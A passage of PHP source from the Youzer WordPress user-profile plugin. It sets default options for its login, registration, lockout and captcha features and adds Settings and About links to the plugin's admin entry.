            'logy_login_form_subtitle'          => __( 'Sign in to your account', 'youzer' ),

            // Social Login
            'logy_social_btns_icons_position'   => 'logy-icons-left',
            'logy_social_btns_format'           => 'logy-border-radius',
            'logy_social_btns_type'             => 'logy-only-icon',
            'logy_enable_social_login'          => 'on',
            'logy_use_auth_modal'               => 'on',

            // Lost Password Form
            'logy_lostpswd_form_enable_header'  => 'on',
            'logy_lostpswd_form_title'          => __( 'Forgot your password?', 'youzer' ),
            'logy_lostpswd_submit_btn_title'    => __( 'Reset Password', 'youzer' ),
            'logy_lostpswd_form_subtitle'       => __( 'Reset your account password', 'youzer' ),

            // Register Form
            'logy_show_terms_privacy_note'      => 'on',
            'logy_signup_form_enable_header'    => 'on',
            'logy_signup_form_layout'           => 'logy-field-v1',
            'logy_signup_icons_position'        => 'logy-icons-left',
            'logy_signup_actions_layout'        => 'logy-regactions-v1',
            'logy_signup_btn_icons_position'    => 'logy-icons-left',
            'logy_signup_btn_format'            => 'logy-border-radius',
            'logy_signup_fields_format'         => 'logy-border-flat',
            'logy_signup_signin_btn_title'      => __( 'Log In', 'youzer' ),
            'logy_signup_form_title'            => __( 'Sign Up', 'youzer' ),
            'logy_signup_register_btn_title'    => __( 'Sign Up', 'youzer' ),
            'logy_signup_form_subtitle'         => __( 'Create New Account', 'youzer' ),

            // Limit Login Settings
            'logy_long_lockout_duration'    => 86400,
            'logy_short_lockout_duration'   => 43200,
            'logy_retries_duration'         => 1200,
            'logy_enable_limit_login'       => 'on',
            'logy_allowed_retries'          => 4,
            'logy_allowed_lockouts'         => 2,

            // User Tags Settings
            'yz_enable_user_tags' => 'on',
            'yz_enable_user_tags_icon' => 'on',
            'yz_enable_user_tags_description' => 'on',
            'yz_wg_user_tags_border_style' => 'radius',


            // Mail Settings
            'yz_enable_mailster' => 'off',
            'yz_enable_mailchimp' => 'off',
            'logy_notify_admin_on_registration' => 'on',

            // Admin Toolbar & Dashboard
            'logy_hide_subscribers_dash' => 'off',

            // Captcha.
            'logy_enable_recaptcha' => 'on',

            // Panel Messages.
            'logy_msgbox_captcha' => 'on',

        );
        
        // Filter.
        $default_options = apply_filters( 'yz_default_options', $default_options );
        
        return $default_options;
    }

    /**
     * Youzer Action Links
     */
    function plugin_action_links( $links ) {
        // Get Youzer Plugin Pages. 
        $panel_url = esc_url( add_query_arg( array( 'page' => 'youzer-panel' ), admin_url( 'admin.php' ) ) );
        $plugin_url = "https://codecanyon.net/item/youzer-new-wordpress-user-profiles-era/19716647";
        
        // Add a few links to the existing links array.
        return array_merge( $links, array(
            'settings' => '<a href="' . $panel_url . '">' . esc_html__( 'Settings', 'youzer' ) . '</a>',
            'about'    => '<a href="' . $plugin_url . '">' . esc_html__( 'About',    'youzer' ) . '</a>'
        ) );

    }

}